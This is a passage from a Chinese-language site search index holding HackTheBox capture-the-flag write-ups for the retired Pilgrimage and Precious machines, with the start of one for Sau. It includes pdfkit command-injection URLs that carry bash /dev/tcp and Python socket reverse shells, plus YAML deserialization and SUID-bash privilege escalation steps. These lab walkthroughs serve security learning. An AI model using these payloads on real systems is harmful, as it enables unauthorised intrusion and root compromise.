\u5373\u53ef\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Pilgrimage/#binwalkpspy","title":"\u5bfb\u627e\u53ef\u7591binwalk\u6267\u884c\uff1apspy\u65b9\u5f0f","text":"<p>\u5c06pspy64\u4f20\u5230\u9776\u673a\u8fd0\u884c\uff0c\u53ef\u4ee5\u53d1\u73b0\u4f3c\u4e4e\u572880\u7aef\u53e3\u7684\u7f51\u7ad9\u4e00\u4e0a\u4f20\u56fe\u7247\u5c31\u4f1a\u63a5\u7740\u89e6\u53d1\u4e00\u4e2a <code>/usr/sbin/malwarescan.sh</code> \u811a\u672c\u6267\u884c\u3002 \u8fd9\u6b21\u7531\u4e8e\u9776\u673a\u662f\u516c\u7528\uff0c\u6240\u4ee5\u8fd8\u6709\u597d\u591a\u73a9\u5bb6\u4e00\u8d77\u6253\uff0c\u7b97\u662f\u5e2e\u4e86\u5927\u5fd9\u4e86\u3002\u4e0d\u7136\u81ea\u5df1\u53ef\u80fd\u4f1a\u5b8c\u5168\u4e22\u5f03\u8fd9\u4e2a\u6211\u89c9\u5f97\u5df2\u7ecf\u653b\u7565\u5b8c\u6210\u768480\u7aef\u53e3\u3002</p> <pre><code>2023/06/29 20:03:37 CMD: UID=33    PID=1293   | php-fpm: pool www                                                                                                                                                                     \n2023/06/29 20:03:37 CMD: UID=33    PID=1294   | /var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/649d56f9a548f5.45061830_gkfhjmoinlpqe.png -resize 50% /var/www/pilgrimage.htb/shrunk/649d56f9a553f.png             \n2023/06/29 20:03:37 CMD: UID=33    PID=1295   | /var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/649d56f9a548f5.45061830_gkfhjmoinlpqe.png -resize 50% /var/www/pilgrimage.htb/shrunk/649d56f9a553f.png             \n2023/06/29 20:03:37 CMD: UID=0     PID=1296   | fusermount -o ro,nosuid,nodev,subtype=magick -- /tmp/.mount_magicklua6M4                                                                                                              \n2023/06/29 20:03:37 CMD: UID=0     PID=1298   | /lib/systemd/systemd-udevd \n2023/06/29 20:03:37 CMD: UID=33    PID=1297   | /var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/649d56f9a548f5.45061830_gkfhjmoinlpqe.png -resize 50% /var/www/pilgrimage.htb/shrunk/649d56f9a553f.png             \n2023/06/29 20:03:37 CMD: UID=33    PID=1301   | /bin/bash /tmp/.mount_magicklua6M4/AppRun convert /var/www/pilgrimage.htb/tmp/649d56f9a548f5.45061830_gkfhjmoinlpqe.png -resize 50% /var/www/pilgrimage.htb/shrunk/649d56f9a553f.png  \n2023/06/29 20:03:37 CMD: UID=33    PID=1300   | /bin/bash /tmp/.mount_magicklua6M4/AppRun convert /var/www/pilgrimage.htb/tmp/649d56f9a548f5.45061830_gkfhjmoinlpqe.png -resize 50% /var/www/pilgrimage.htb/shrunk/649d56f9a553f.png  \n2023/06/29 20:03:37 CMD: UID=33    PID=1302   | \n2023/06/29 20:03:37 CMD: UID=33    PID=1303   | /bin/bash /tmp/.mount_magicklua6M4/AppRun convert /var/www/pilgrimage.htb/tmp/649d56f9a548f5.45061830_gkfhjmoinlpqe.png -resize 50% /var/www/pilgrimage.htb/shrunk/649d56f9a553f.png  \n2023/06/29 20:03:37 CMD: UID=33    PID=1304   | \n2023/06/29 20:03:37 CMD: UID=33    PID=1305   | /bin/bash /tmp/.mount_magicklua6M4/AppRun convert /var/www/pilgrimage.htb/tmp/649d56f9a548f5.45061830_gkfhjmoinlpqe.png -resize 50% /var/www/pilgrimage.htb/shrunk/649d56f9a553f.png  \n2023/06/29 20:03:37 CMD: UID=33    PID=1306   | /bin/bash /tmp/.mount_magicklua6M4/AppRun convert /var/www/pilgrimage.htb/tmp/649d56f9a548f5.45061830_gkfhjmoinlpqe.png -resize 50% /var/www/pilgrimage.htb/shrunk/649d56f9a553f.png  \n2023/06/29 20:03:37 CMD: UID=33    PID=1307   | /bin/bash /tmp/.mount_magicklua6M4/AppRun convert /var/www/pilgrimage.htb/tmp/649d56f9a548f5.45061830_gkfhjmoinlpqe.png -resize 50% /var/www/pilgrimage.htb/shrunk/649d56f9a553f.png  \n2023/06/29 20:03:37 CMD: UID=0     PID=1308   | /bin/bash /usr/sbin/malwarescan.sh \n2023/06/29 20:03:37 CMD: UID=0     PID=1309   | /bin/bash /usr/sbin/malwarescan.sh \n2023/06/29 20:03:37 CMD: UID=0     PID=1311   | /bin/bash /usr/sbin/malwarescan.sh \n2023/06/29 20:03:37 CMD: UID=0     PID=1310   | /bin/bash /usr/sbin/malwarescan.sh \n2023/06/29 20:03:37 CMD: UID=0     PID=1312   | /bin/bash /usr/sbin/malwarescan.sh \n2023/06/29 20:03:38 CMD: UID=33    PID=1313   | /var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/649d56f9a548f5.45061830_gkfhjmoinlpqe.png -resize 50% /var/www/pilgrimage.htb/shrunk/649d56f9a553f.png\n</code></pre> <p>\u4e0d\u662f\u5f88\u61c2\u4e3a\u4ec0\u4e48\u597d\u51e0\u6761\u540c\u6837\u7684\u547d\u4ee4\u7528\u4e86\u51e0\u4e2a\u8fdb\u7a0b\u53bb\u6267\u884c</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Pilgrimage/#_6","title":"\u5206\u6790\u76ee\u6807\u811a\u672c\u7684\u5229\u7528\u65b9\u5f0f","text":"<p>\u770b\u4e00\u4e0b\u6211\u4eec\u5b9a\u4f4d\u5230\u7684\u53ef\u7591\u811a\u672c\uff1a <pre><code>cat /usr/sbin/malwarescan.sh\n#!/bin/bash\n\nblacklist=(\"Executable script\" \"Microsoft executable\")\n\n/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do\n        filename=\"/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo \"$FILE\" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')\"\n        binout=\"$(/usr/local/bin/binwalk -e \"$filename\")\"\n        for banned in \"${blacklist[@]}\"; do\n                if [[ \"$binout\" == *\"$banned\"* ]]; then\n                        /usr/bin/rm \"$filename\"\n                        break\n                fi\n        done\ndone\n</code></pre></p> <p>\u6709\u4e00\u4e9b\u6ca1\u600e\u4e48\u89c1\u8fc7\u7684\u547d\u4ee4\uff0c\u5982 <code>inotifywait</code>\uff0c\u5c06\u6574\u4e2a\u811a\u672c\u6254\u7ed9ChatGPT\uff1a</p> <p><code>/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do</code>: \u8fd9\u662f\u4e00\u4e2ainotifywait\u547d\u4ee4\uff0c\u7528\u4e8e\u76d1\u89c6\u76ee\u5f55<code>/var/www/pilgrimage.htb/shrunk/</code>\u4e2d\u7684\u6587\u4ef6\u521b\u5efa\u4e8b\u4ef6\u3002<code>-m</code>\u9009\u9879\u8868\u793a\u6301\u7eed\u76d1\u89c6\uff0c<code>-e create</code>\u8868\u793a\u53ea\u5173\u6ce8\u6587\u4ef6\u7684\u521b\u5efa\u4e8b\u4ef6\u3002\u7ba1\u9053\u64cd\u4f5c\u7b26<code>|</code>\u5c06inotifywait\u7684\u8f93\u51fa\u4f20\u9012\u7ed9\u540e\u7eed\u7684\u547d\u4ee4\u3002</p> <p>\u5373\u5176\u5b9e\u5173\u952e\u662f\u901a\u8fc7 <code>inotifywait</code> \u547d\u4ee4\u7684\u76d1\u63a7\uff0c\u5982\u679c <code>/var/www/pilgrimage.htb/shrunk/</code> \u4e0b\u6709\u65b0\u6587\u4ef6\u65f6\uff0c\u5bf9\u5176\u8fdb\u884c\u8bfb\u53d6\u5e76\u8c03\u7528\u6211\u4eec\u6240\u671f\u671b\u7684 <code>binwalk -e</code>\u3002 \u9700\u8981\u6ce8\u610f\uff0c\u5173\u4e8e\u201c<code>-e create</code>\u8868\u793a\u53ea\u5173\u6ce8\u6587\u4ef6\u7684\u521b\u5efa\u4e8b\u4ef6\u201d\uff0c\u770b\u8be5\u547d\u4ee4\u7684help\u6587\u6863\u53ef\u4ee5\u53d1\u73b0\uff0c\u201c\u79fb\u52a8\u201d\u8fc7\u53bb\u7684\u6587\u4ef6\u4e0d\u7b97\u662f\u201c\u521b\u5efa\u201d\uff0c\u6240\u4ee5\u7528 <code>mv</code> \u547d\u4ee4\u662f\u65e0\u6548\u7684\u3002</p> <pre><code>emily@pilgrimage:~$ /usr/bin/inotifywait --help\n\u2026\u2026\n        -e|--event &lt;event1&gt; [ -e|--event &lt;event2&gt; ... ]\n                Listen for specific event(s).  If omitted, all events are \n                listened for.\n\u2026\u2026\nEvents:\n        moved_to        file or directory moved to watched directory\n        moved_from      file or directory moved from watched directory\n        move            file or directory moved to or from watched directory\n        create          file or directory created within watched directory\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Pilgrimage/#expshell","title":"\u4e0a\u4f20exp\u3001\u89e6\u53d1\u53cd\u5f39shell","text":"<p>\u5c06\u6211\u4eec\u4e4b\u524d\u7528exp\u811a\u672c\u751f\u6210\u7684\u56fe\u7247payload\uff08binwalk_exploit.png\uff09\u4f20\u5230\u9776\u673a\uff08\u7531\u4e8e\u73a9\u5bb6\u8f83\u591a\u6240\u4ee5\u7a0d\u5fae\u6539\u4e86\u4e00\u4e0b\u56fe\u7247\u540d\uff09\uff0c\u5f00\u542f\u76d1\u542c\uff0c\u7136\u540e <code>cp</code> \u5c06\u6587\u4ef6\u590d\u5236\u5230 <code>/var/www/pilgrimage.htb/shrunk/</code>\uff0c\u5373\u53ef\u83b7\u5f97root\u6743\u9650\u7684\u53cd\u5f39shell\u3002</p> <pre><code>\u2514\u2500$ nc -lvnp 4444           \nlistening on [any] 4444 ...\nconnect to [10.xx.xx.xx] from (UNKNOWN) [10.10.11.219] 51448\n\nid\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Pilgrimage/#flag-root","title":"flag: root","text":"<p>\u4e00\u5f00\u59cb\u5e76\u4e0d\u5728/root\u76ee\u5f55\u4e0b\uff0c\u5e94\u8be5\u8ddf\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u539f\u7406\u6709\u5173\u3002\u79fb\u52a8\u5230/root\u76ee\u5f55\u540e\u5373\u53ef\u83b7\u53d6root flag\u3002</p> <pre><code>ls \n_649d565edf744.png.extracted\n_649d569d6aa82.png.extracted\n_649d56b47cc76.png.extracted\n_649d56e1eae10.png.extracted\n_649d56f9a553f.png.extracted\n_binxp1.png.extracted\npwd\n/root/quarantine\ncd \nls\nquarantine\nreset.sh\nroot.txt\ncat root.txt\n221b\u2026\u20264a2d\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Pilgrimage/#_7","title":"\u603b\u7ed3\u00b7\u540e\u8bb0","text":"<p>2023/06/26</p> <p>\u8fd9\u6b21\u7684\u7a81\u7834\u53e3\u662f.git\u6cc4\u9732\u554a\uff0c\u8fd8\u662f\u7b2c\u4e00\u6b21\u542c\u8bf4\u3002\u6240\u4ee5\u7f51\u7ad9\u6839\u76ee\u5f55\u4e0b\u4e0d\u80fd\u653e.git\u6587\u4ef6\u5939\u3002 \u4ee5\u53ca\u540e\u6765\u770b\u4e86\u4e00\u4e0b\u5404\u4e2a\u76ee\u5f55\u66b4\u7834\u7684\u5b57\u5178\uff0c\u90fd\u6ca1\u6709\u770b.git\u4e0b\u7684\u6587\u4ef6\u7684\u3002\u770b\u6765\u4ee5\u540e\u4e5f\u9700\u8981\u5c06\u5176\u4f5c\u4e3a\u4e00\u4e2a\u653b\u51fb\u5411\u91cf\uff0c\u5728\u6700\u5f00\u59cb\u5c31\u4e00\u5e76\u5c1d\u8bd5\u3002\u4e8e\u662f\u53c8\u66f4\u65b0\u4e86\u6211\u7684WP\u6a21\u677f\u3002  </p> <p>\u7136\u540e\u5c31\u662f\u51e0\u6b21\u56fe\u7247payload\u7684\u5229\u7528\u3002\u672c\u6765\u4ee5\u4e3a\u4f1a\u662f\u56fe\u7247webshell\uff0c\u7adf\u7136\u662f\u4ee5\u5176\u4ed6\u65b9\u5f0f\uff0c\u6709\u610f\u601d\u3002\u4e0d\u8fc7\u5177\u4f53\u539f\u7406\u4e5f\u4f9d\u65e7\u6ca1\u8be6\u7ec6\u770b\uff0c\u6316\u5751\u7b49\u4e4b\u540e\u6709\u7a7a\u8865\u8865\u4e86\u2026\u2026</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Precious/","title":"HTB-Precious","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Precious/#_1","title":"\u626b\u63cf","text":"<pre><code>ports=$(nmap -n -Pn -sS  -p- &lt;ip&gt; --max-retries=1 | grep ^[0-9] | cut -d / -f1 | tr '\\n' ',' | sed s/,$//)\nnmap -v -n -sC -sV -p ${ports} &lt;ip&gt; -oN Precious.nmap\n</code></pre> <p>\u53ea\u626b\u51fa22\u300180\u7aef\u53e3\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Precious/#_2","title":"\u6f0f\u6d1e\u5206\u6790","text":"<p>22\u7aef\u53e3\uff08openssh 8.4p1 debian 5+deb11u1 (protocol 2.0)\uff09\u627e\u4e86\u4e00\u4e0b\u4f3c\u4e4e\u65e0\u6f0f\u6d1e\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Precious/#80","title":"80\u7aef\u53e3","text":"<p>\u8bbf\u95ee\u7f51\u9875\u65e0\u663e\u793a\uff0cURL\u4f1a\u8df3\u8f6c\u5230 <code>precious.htb</code>\uff0c\u5c06\u5176\u52a0\u5165hosts\u6587\u4ef6\u540e\u5373\u53ef\u8bbf\u95ee\u3002</p> <ul> <li>\u65e0robots  </li> <li>\u7f51\u9875\u6e90\u7801\u65e0\u53d1\u73b0  </li> <li>\u76ee\u5f55\u679a\u4e3e\u65e0\u53d1\u73b0  </li> <li>\u7f51\u9875\u529f\u80fd\u4f3c\u4e4e\u662f\u5c06\u7f51\u9875\u8f6cpdf  </li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Precious/#_3","title":"\u7814\u7a76\u7f51\u9875\u529f\u80fd","text":"<p>\u5c1d\u8bd5\u51e0\u4e2a\u7f51\u5740\u65e0\u7279\u522b\u53cd\u5e94\uff0c\u4f3c\u4e4e\u4e00\u5b9a\u8981 <code>http://</code> \u6216 <code>https://</code> \u5f00\u5934\uff0c\u4e14\u4e00\u76f4\u62a5\u9519\u8bf4\u4e0d\u80fd\u7528remote URL\u3002</p> <p>\u8ff7\u832b\u2026\u2026\u770b\u4e86\u773cForum\u8bf4\u65e2\u7136\u4e0d\u80fd\u7528remote\u90a3\u53ef\u4ee5\u8bd5\u8bd5local\u2026\u2026</p> <p>\u5c1d\u8bd5\u672c\u5730\u7528python\u5f00\u542fhttp\u670d\u52a1\uff0c\u968f\u4fbf\u5efa\u7acb\u4e00\u4e2a\u6587\u672c\uff0c\u56de\u5230\u7f51\u9875\u8f93\u5165\u81ea\u5df1\u7684URL\u3002 \u4f1a\u5f39\u7f51\u9875\u65b0\u6807\u7b7e\u663e\u793a\u521a\u521a\u6587\u672c\u7684pdf\u3002 \u53c8\u8bd5\u4e86\u4e0b\u5c06\u6587\u672c\u6539\u4e3ahtml\uff0c\u91cc\u9762\u63d2\u5165js\u7684 <code>alert(1)</code>\u3002\u518d\u6b21\u8bbf\u95ee\uff0c\u5f39\u51fapdf\u987a\u4fbfjs\u4e5f\u6709\u53cd\u6620\u3002\u4e0d\u8fc7XSS\u4e0d\u5927\u719f\uff0c\u6b62\u6b65\u4e8e\u6b64\u2026\u2026</p> <p>\u770bForum\u7684\u63d0\u793a\uff0c\u4f3c\u4e4e\u8981\u4e0b\u8f7dpdf\u770b\u770b\u5c5e\u6027\u3002</p> <p>\u4e0b\u8f7dpdf\uff0c\u5c5e\u6027\u91cc\u6ca1\u627e\u5230\u5565\u3002 <code>strings</code> \u547d\u4ee4\u770b\u5230 pdfkit\uff0c\u641c\u4e86\u4e0b\u6709PoC\u3002</p> <p>\u5c1d\u8bd5 <code>http://&lt;ip&gt;/?name=#{'%20`sleep 5`'}</code>\u3002\u6709\u6548\uff0c5\u79d2\u540e\u4f1a\u76f4\u63a5\u663e\u793aweb\u6839\u76ee\u5f55\u4e0b\u7684\u5185\u5bb9\u3002  </p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Precious/#foothold","title":"foothold","text":"<ul> <li> <p>\u5c1d\u8bd5\u53cd\u5f39shell\uff08\u65e0\u6548\uff09 <pre><code>http://&lt;ip&gt;/?name=#{'%20\\`bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1`'} \n</code></pre></p> </li> <li> <p>\u8bd5\u4e00\u4e0bbase64\uff08\u65e0\u6548\uff09 <pre><code>http://&lt;ip&gt;/?name=#{'%20`echo YmFzaCAtaSA+JiAv......IDA+JjE=|base64 -d`'} \n</code></pre></p> </li> <li> <p>\u5957\u4e00\u5c42shell\u6267\u884c\uff08\u65e0\u6548\uff09 <pre><code>http://&lt;ip&gt;/?name=#{'%20`bash -c \"echo YmFzaCAtaSA+JiAv......IDA+JjE=|base64 -d\"`'} \n</code></pre></p> </li> <li> <p>python3\u53ef\u4ee5 <pre><code>http://&lt;ip&gt;/?name=#{'%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"&lt;ip&gt;\",&lt;port&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'`'} \n</code></pre></p> </li> </ul> <p>\u4e0d\u8fc7\u540e\u6765\u56de\u987e\u7684\u65f6\u5019\uff0c\u5728\u672c\u5730\u8bd5\u4e86\u4e00\u4e0b\u65e0\u6548\u7684\u90a3\u51e0\u4e2a\uff1a \u7b2c\u4e00\u4e2a\u62a5\u9519\uff1a\u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55: /dev/tcp/&lt;ip&gt;/&lt;port&gt;\u3002 \u7b2c\u4e8c\u3001\u4e09\u4e2a\u62a5\u9519\uff1a&gt;&amp;: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55\u3002 \u800cbase64\u5c1d\u8bd5\u8fd9\u4e2a\u53ef\u4ee5\uff1a <code>http://example.com/?name=#{'%20`echo YmFzaCAtaSA+JiAv......IDA+JjE=|base64 -d|bash`'}</code> (\u4e0d\u80fd\u7528 <code>bash -c</code> \uff1f) </p> <p>\u540e\u6765\u624d\u53d1\u73b0\u4e0b\u8f7d\u5b8cpdf\u540e\uff0cget shell\u5176\u5b9e\u5e76\u4e0d\u5fc5\u4e00\u76f4\u7528local URL\u3002\u76f4\u63a5 <code>http://example.com/?name=#{'%20`sleep 5`'}</code> \u4e5f\u884c\u3002</p> <p>\u4ee5\u53ca\u5176\u5b9e\u65e2\u7136 PoC \u662fruby\u7684pdfkit\u6f0f\u6d1e\uff0c\u5176\u5b9e\u76f4\u63a5\u627eruby\u7684getshell\u5199\u6cd5\u5c31\u662f\u4e86\u3002\u3002\u3002</p> <p>get shell\u540e\uff0c<code>id</code> \u662fruby\u8d26\u6237\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Precious/#shell","title":"\u5347\u7ea7\u4e3a\u4ea4\u4e92\u5f0fshell","text":"<p>\u56e0\u4e3a\u672c\u6765\u5c31\u662fpython\u53cd\u5f39\u7684bash\u6240\u4ee5\u76f4\u63a5\uff1a <pre><code>export TERM=xterm\nCtrl+Z\nstty raw -echo; fg\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Precious/#get-user-flag","title":"get user flag","text":"<p>home\u76ee\u5f55\u6709\u7528\u6237 <code>henry</code>\uff0c\u800cruby\u7684\u5bb6\u76ee\u5f55 <code>.bundle/config</code> \u91cc\u6709\u5176\u5bc6\u7801\u3002 \u8f6c\u5230henry\u8d26\u53f7\uff0c\u5176\u5bb6\u76ee\u5f55\u6709flag\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Precious/#_4","title":"\u63d0\u6743","text":"<p><code>sudo -l</code> \u4e00\u822c\u662f\u6211\u9996\u5148\u4f1a\u5c1d\u8bd5\u7684\u3002 henry\u7684 <code>sudo -l</code> \u53d1\u73b0\u6709root\u6743\u9650\u65e0\u5bc6\u7801\u6267\u884c <code>/usr/bin/ruby /opt/update_dependencies.rb</code> </p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Precious/#poc","title":"PoC","text":"<p><code>update_dependencies.rb</code> \u811a\u672c\u91cc\u9762\u6709load\u6587\u4ef6\u7684\u65b9\u6cd5\u5c31\u5341\u5206\u8ba9\u4eba\u5728\u610f\uff08<code>YAML.load(File.read(\"dependencies.yml\"))</code>\uff09 \u8c37\u6b4c\uff1aruby yaml.load file exploit \u627e\u5230\u8fd9\u7bc7PoC\u6587\u7ae0\uff08\u6587\u7ae0\u6700\u4e0b\u9762\u6709github\u7684payload\uff09</p> <p>\u590d\u5236 <code>/opt/sample/dependencies.yml</code> (\u5230\u5bb6\u76ee\u5f55)\u5e76\u5c06payload\u5199\u5165\u3002 <pre><code>sudo /usr/bin/ruby /opt/update_dependencies.rb\n</code></pre> \u6267\u884c\u540e\u6709\u56de\u663eid\u547d\u4ee4\u7684\u7ed3\u679c\u662froot\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Precious/#1root-shell","title":"\u65b9\u6cd51\uff1a\u53cd\u5f39root shell","text":"<p>\u6ce8\u5165 <code>\"bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1'\"</code> </p> <ul> <li>\u53ea\u6709 'bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1' \u7684\u8bdd\u4f1a\u6709\"bad fd\"\u62a5\u9519\u3002</li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Precious/#2bashsuid","title":"\u65b9\u6cd52\uff1a\u7ed9bash\u547d\u4ee4\u6dfb\u52a0SUID","text":"<p>\u6ce8\u5165 <code>\"chmod +s /bin/bash\"</code>\uff0c\u7136\u540e\u6267\u884c <code>bash -p</code> \u5373\u53ef\u83b7\u5f97\u9644\u52a0\u4e86root\u7684shell  </p> <ul> <li>ref: https://0xdedinfosec.vercel.app/blog/hackthebox-precious-writeup</li> <li>\u8fd8\u4e0d\u592a\u61c2\u8fd9\u4e2a <code>bash -p</code> \u7684\u539f\u7406\uff0c\u7559\u5751</li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Precious/#3","title":"\u65b9\u6cd53\uff1a\u547d\u4ee4\u6267\u884c","text":"<p>\u540e\u6765\u60f3\u60f3\uff0c\u7531\u4e8e\u53ea\u662f\u5355\u7eaf\u62ffflag</p> <ul> <li>\u53ef\u4ee5\u76f4\u63a5\u6ce8\u5165 <code>\"bash\"</code> \u62ffroot shell</li> <li>\u6216\u8005\u76f4\u63a5\u6ce8\u5165 <code>\"cat /root/root.txt\"</code> \u62ffflag</li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Precious/#get-root-falg","title":"get root falg","text":"<p><code>cat /root/root.txt</code></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Precious/#_5","title":"\u540e\u8bb0","text":"<p>2022/12/4 \u5176\u5b9e\u7b97\u662f\u7b2c\u4e00\u6b21\u6b63\u7ecf\u6253HTB\uff0c\u4ee5\u524d\u7a0d\u5fae\u8bd5\u4e86\u4e0b\u8fd8\u662f\u89c9\u5f97Web\u6e17\u900f\u77e5\u8bc6\u4e0d\u591f\u7684\u8bdd\u6709\u70b9\u96be\u3002 \u4e3b\u8981\u662f\u770b\u8fd9\u4e24\u5929\u7fa4\u53cb\u8ba8\u8bbaPrecious\uff0c\u7136\u540e\u4e5f\u6709\u5927\u4f6c\u4eec\u7ed9\u51fa\u63d0\u793a\uff0c\u6240\u4ee5\u60f3\u7740\u65e2\u7136\u6709\u63d0\u793a\u90a3\u4e48\u6211\u4e5f\u60f3\u8981\u5c1d\u8bd5\u4e00\u4e0b\u2026\u2026  </p> <p>\u60f3\u60f3\u8fd9\u4e2a\u9776\u673a\u6253\u4e86\u597d\u51e0\u4e2a\u5c0f\u65f6\uff0c\u8fd8\u662f\u6709\u70b9\u8d85\u51fa\u81ea\u5df1\u7684\u5b9e\u529b\u8303\u56f4\u4e86\u3002\u4e0d\u8fc7\u56de\u987e\u8d77\u6765\u53c8\u89c9\u5f97\u5176\u5b9e\u6ca1\u90a3\u4e48\u96be\uff0c\u5f88\u591a\u77e5\u8bc6\u90fd\u6709\u63a5\u89e6\u8fc7\uff0c\u8fd8\u662f\u5b9e\u6218\u7ecf\u9a8c\u592a\u5c11\u4e86\u5427\u3002 \u56f4\u89c2\u7fa4\u91cc\u8ba8\u8bba\u4e5f\u5b66\u5230\u4e86\u5f88\u591a\u7ec6\u8282\uff0c\u6bd4\u5982get shell\u524d\u5e94\u8be5\u5148\u5224\u65ad\u73af\u5883\uff08\u5982\u7528 <code>which python python2 python3</code>\uff09\u3002\u81ea\u5df1\u8fd9\u6b21\u5c31\u662f\u4e71\u8bd5\u4e86\u51e0\u4e2a\u5076\u7136\u7528python3\u53cd\u5f39\u5230\u4e86\u3002  </p> <p>\u4e0d\u8fc7pdfkit\u8fd9\u4e2aPoC\u7684\u547d\u4ee4\u6267\u884c\u4f3c\u4e4e\u6709\u9650\uff0c\u6709\u4e9b\u547d\u4ee4\u5e76\u65e0/\u6216\u8005\u81ea\u5df1\u4e0d\u77e5\u9053\u54ea\u91cc\u6709\u56de\u663e\uff08\u5982 <code>id</code>\uff09\u3002\u540e\u6765\u641cwp\u65f6\u53d1\u73b0\u53e6\u4e00\u4e2a\u7c7b\u4f3c\u7684\u6ce8\u5165\u65b9\u5f0f\uff08<code>http://10.10.XX.XX/?name=%20`id`</code>\uff09\uff0c\u5728\u7528local URL\u65f6\u4f1a\u5728\u7f51\u9875\u56de\u663e\u3002 \u4e5f\u4e0d\u77e5\u9053\u4e3a\u4f55\u660e\u660e\u770b\u7684\u662f\u540c\u4e00\u4e2apdfkit\u8fd9\u4e2aPoC\uff0c\u4e3a\u4ec0\u4e48\u4f1a\u60f3\u5230\u628a <code>#{}</code> \u5220\u6389\u2026\u2026</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Sau/","title":"HTB-Sau","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Sau/#summary","title":"Summary","text":"<p>...</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Sau/#attack-path-overview","title":"Attack Path Overview","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Sau/#_1","title":"\u626b\u63cf","text":"<p>\u81ea\u7528\u626b\u63cf\u811a\u672c\uff1a\u5de5\u4f5c\u6d41</p> <p>\uff08\u524d1\u4e07\u4e2a\uff09\u5f00\u653e\u7aef\u53e3\uff1a <pre><code>PORT      STATE    SERVICE REASON      VERSION\n22/tcp    open     ssh     syn-ack     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n80/tcp    filtered http    no-response\n8338/tcp  filtered unknown no-response\n</code></pre></p> <p>\u6709\u70b9\u5947\u602a\uff0c\u6d4f\u89c8\u5668\u8bbf\u95ee\u4e86\u4e00\u4e0b80\u7aef\u53e3\u786e\u5b9e\u6ca1\u54cd\u5e94\u3002\u4e8e\u662f\u53e6\u5916\u626b\u4e86\u4e00\u4e0b\u5168\u7aef\u53e3\uff0c\u53d1\u73b0\u8fd8\u6709\u4e2a <code>55555/tcp</code> \u662f\u5f00\u653e\u7684\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Sau/#_2","title":"\u653b\u51fb\u8def\u5f84\u89c4\u5212\u00b7\u6f0f\u6d1e\u5206\u6790","text":"<p>\u6709\u70b9\u975e\u5e38\u89c4\uff1f\u4e0d\u8fc7\u8bbf\u95ee\u4e86\u4e00\u4e0b <code>10.10.11.224:55555</code>\uff0c\u4f1a\u88ab\u5b9a\u5411\u5230 <code>http://10.10.11.224:55555/web</code>\uff0c\u5176\u5b9e\u4e5f\u5c31\u662f\u4e2aweb\u5e94\u7528\u300222\u7aef\u53e3\u672c\u8eab\u4f18\u5148\u5ea6\u4e0d\u9ad8\uff0c\u90a3\u4e48\u5148\u770b\u770b\u8fd9\u4e2a\u7aef\u53e3\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Sau/#55555","title":"55555\u7aef\u53e3","text":"<p>\u7531\u4e8e\u662fweb\u5e94\u7528\uff0c\u4e14\u4e0d\u662f\u5e38\u89c480\u7aef\u53e3\uff0c\u5e94\u8be5\u4e0d\u4f1a\u6709robots.txt\u4e4b\u7c7b\u7684\u4fe1\u606f\u3002\u5927\u6982\u7387\u662f\u7814\u7a76\u4ed6\u8fd9\u4e2a\u5e94\u7528\u7684\u529f\u80fd\u3002</p> 